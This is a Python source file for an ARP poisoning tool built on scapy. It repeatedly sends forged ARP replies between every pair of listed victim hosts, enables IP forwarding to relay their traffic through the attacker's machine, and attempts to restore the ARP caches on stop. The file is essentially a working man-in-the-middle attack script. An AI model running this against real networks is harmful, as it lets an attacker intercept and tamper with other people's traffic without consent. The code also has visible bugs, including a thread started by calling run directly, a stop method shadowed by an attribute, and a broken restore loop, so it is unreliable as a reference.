from scapy.all import *
import signal
import sys
import time

from scapy.layers.l2 import arping, Ether, ARP


class ArpPois():

    def __init__(self):
        self.victims_ip = None
        self.victims_mac = None
        self.target_ip = None
        self.target_mac = None
        self.stop = False
        self.thread = None

    def set_victims(self, victims_ip, victims_mac):
        self.victims_ip = victims_ip
        self.victims_mac = victims_mac

    def set_target(self, target_ip, target_mac):
        self.target_ip = target_ip
        self.target_mac = target_mac

    def poison(self, ip2, ip, mac2, mac):
        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=self.target_mac))
        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=self.target_mac))

    @staticmethod
    def restore(ip2, ip, mac2, mac):
        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac2), count=3)
        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac), count=3)
        sys.exit("losing...")

    def run(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('1\n')

        while not self.stop:
            for ip, mac in zip(self.victims_ip, self.victims_mac):
                for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                    if ip != ip2:
                        self.poison(ip2, ip, mac2, mac)
            time.sleep(5)

    def start(self):
        self.stop = False
        self.thread = threading.Thread(target=self.run())
        self.thread.start()

    def stop(self):
        self.stop = True
        self.thread.join()

        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')

        for vic_ip, vic_mac in self.victims_ip, self.victims_mac:
            self.restore(self.target_ip, vic_ip, self.target_mac, vic_mac)
